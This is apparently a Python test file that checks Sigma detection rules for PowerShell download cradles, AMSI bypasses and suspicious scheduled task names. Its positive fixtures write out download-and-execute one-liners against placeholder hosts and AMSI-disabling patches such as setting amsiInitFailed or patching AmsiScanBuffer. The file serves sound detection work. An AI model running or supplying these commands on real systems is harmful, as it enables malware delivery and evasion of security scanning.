"""Positive/negative fixtures for the PowerShell and scheduled-task rules.

A minimal Sigma evaluator (contains / startswith / endswith / re, `and`, `or`,
`not`, parentheses) runs each rule's real detection block against sample events.
It only has to cover the modifiers these rules use.
"""

from __future__ import annotations

import re
import unittest
from pathlib import Path

import yaml

RULES = Path(__file__).resolve().parents[2] / "rules" / "sigma" / "windows"


def _load(name: str) -> dict:
    return yaml.safe_load((RULES / name).read_text())["detection"]


def _match_value(modifier: str, actual: str, expected: str) -> bool:
    if modifier == "re":
        # The engine uses Rust regex; Python's `re` agrees on the subset used here.
        return re.search(expected, actual) is not None
    actual, expected = actual.lower(), expected.lower()
    if modifier == "endswith":
        return actual.endswith(expected)
    if modifier == "startswith":
        return actual.startswith(expected)
    if modifier == "contains":
        return expected in actual
    return actual == expected


def _selection(sel: dict, event: dict) -> bool:
    for key, expected in sel.items():
        field, _, modifier = key.partition("|")
        actual = str(event.get(field, ""))
        values = expected if isinstance(expected, list) else [expected]
        if not any(_match_value(modifier, actual, str(v)) for v in values):
            return False
    return True


def fires(detection: dict, event: dict) -> bool:
    names = {k: _selection(v, event) for k, v in detection.items() if k != "condition"}
    expr = " ".join(str(detection["condition"]).split())
    return bool(eval(expr, {"__builtins__": {}}, names))  # noqa: S307


class DownloadCradleTests(unittest.TestCase):
    det = _load("ps_script_win_susp_powershell_download_cradle.yml")

    def check(self, text: str, expected: bool) -> None:
        self.assertEqual(fires(self.det, {"ScriptBlockText": text}), expected, text)

    def test_positive(self) -> None:
        for text in (
            "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a.ps1')",
            "(New-Object Net.WebClient).DownloadString('https://x.test/a') | iex",
            "iwr https://x.test/a.ps1 -UseBasicParsing | Invoke-Expression",
            "Invoke-Expression (Invoke-WebRequest 'https://x.test/a').Content",
            "$c = New-Object Net.WebClient\nIEX ($c.DownloadString('http://x.test/a'))",
            "Start-BitsTransfer https://x.test/a.exe $env:TEMP\\a.exe; Start-Process $env:TEMP\\a.exe",
        ):
            self.check(text, True)

    def test_negative(self) -> None:
        for text in (
            # Microsoft module manifest: names listed, nothing invoked.
            "@{ ModuleVersion = '3.1.0.0'; HelpInfoUri = 'https://go.microsoft.com/fwlink/?linkid=1'\n"
            "  CmdletsToExport = 'Invoke-WebRequest','Invoke-RestMethod','Invoke-Expression' }",
            "FunctionsToExport = @('Invoke-Expression', 'Invoke-WebRequest', 'Start-BitsTransfer')\n"
            "ProjectUri = 'https://github.com/PowerShell/PowerShell'",
            # Download without execution.
            "Invoke-WebRequest https://x.test/a.zip -OutFile a.zip",
            "(New-Object Net.WebClient).DownloadString('https://x.test/version.txt')",
            # Execution without a download.
            "Get-Content .\\a.ps1 | iex",
            "Invoke-Expression $localCommand # see https://docs.test",
        ):
            self.check(text, False)


class AmsiBypassTests(unittest.TestCase):
    det = _load("ps_script_win_susp_amsi_bypass.yml")

    def check(self, text: str, expected: bool) -> None:
        self.assertEqual(fires(self.det, {"ScriptBlockText": text}), expected, text)

    def test_positive(self) -> None:
        for text in (
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
            ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
            "$f = [Ref].Assembly.GetType('x.AmsiUtils').GetField('amsiContext','NonPublic,Static');"
            " [Runtime.InteropServices.Marshal]::WriteInt32($f.GetValue($null),0x41)",
            "$a = GetProcAddress $amsi 'AmsiScanBuffer'; VirtualProtect($a, 6, 0x40, [ref]$o)",
            "[System.Runtime.InteropServices.Marshal]::Copy($patch,0,$AmsiOpenSession,3)",
        ):
            self.check(text, True)

    def test_negative(self) -> None:
        for text in (
            "# Detection note: attackers set amsiInitFailed to disable AMSI",
            "Write-Host 'Checking for AmsiUtils tampering'",
            "if ($log -match 'AmsiScanBuffer') { Write-Output 'AMSI scan seen' }",
            "FunctionsToExport = 'Get-AmsiContext'  # amsiContext helper docs",
        ):
            self.check(text, False)


class ScheduledTaskNameTests(unittest.TestCase):
    det = _load("task_creation_win_hunting_scheduled_task_name.yml")

    def check(self, name: str, user: str, expected: bool) -> None:
        event = {"TaskName": name, "UserName": user}
        self.assertEqual(fires(self.det, event), expected, (name, user))

    def test_positive(self) -> None:
        self.check("\\Updater", "CORP\\alice", True)
        self.check("\\WindowsUpdate", "CORP\\alice", True)
        self.check("\\SystemCheck", "WORKGROUP\\bob", True)

    def test_negative(self) -> None:
        # Vendor folder, not a root-level task.
        self.check(
            "\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan", "NT AUTHORITY\\SYSTEM", False
        )
        self.check("\\GoogleUpdater\\Update", "CORP\\alice", False)
        # Root-level but a service account registered it.
        self.check("\\Updater", "NT AUTHORITY\\SYSTEM", False)
        # Specific product task name.
        self.check("\\OneDrive Standalone Update Task-S-1-5-21", "CORP\\alice", False)


if __name__ == "__main__":
    unittest.main()
